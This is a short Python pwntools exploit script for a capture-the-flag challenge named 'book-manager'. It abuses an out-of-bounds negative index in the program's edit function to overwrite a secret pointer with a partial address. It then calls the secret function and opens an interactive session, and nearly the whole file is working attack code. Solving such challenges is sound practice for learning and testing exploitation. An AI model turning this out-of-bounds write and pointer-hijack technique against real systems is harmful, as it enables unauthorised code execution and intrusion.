from pwn import *

HOST = 'book-manager.challs.infobahnc.tf'
PORT = 1337

context.binary = ELF('handout/chall')

MENU = b'Choose an option:'


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(context.binary.path)


def menu_choice(io, num):
    io.sendlineafter(MENU, str(num).encode())


def create(io, title: bytes, author: bytes):
    menu_choice(io, 1)
    io.sendlineafter(b'Enter title:', title)
    io.sendlineafter(b'Enter author:', author)


def edit(io, idx: int, new_title: bytes, new_author: bytes):
    menu_choice(io, 3)
    io.sendlineafter(b'Enter book index to edit:', str(idx).encode())
    io.sendlineafter(b'Enter new title:', new_title)
    io.sendlineafter(b'Enter new author:', new_author)


def get_secret(io):
    menu_choice(io, 5)


def main():
    io = start()

    create(io, b'A', b'B')

    target_idx = -2056  # overwrite manager->secret pointer
    new_ptr = bytes([0x10, 0x11, 0x40])  # patch 0x401090 -> 0x401110
    edit(io, target_idx, new_ptr, b'')

    get_secret(io)

    io.interactive()


if __name__ == '__main__':
    main()
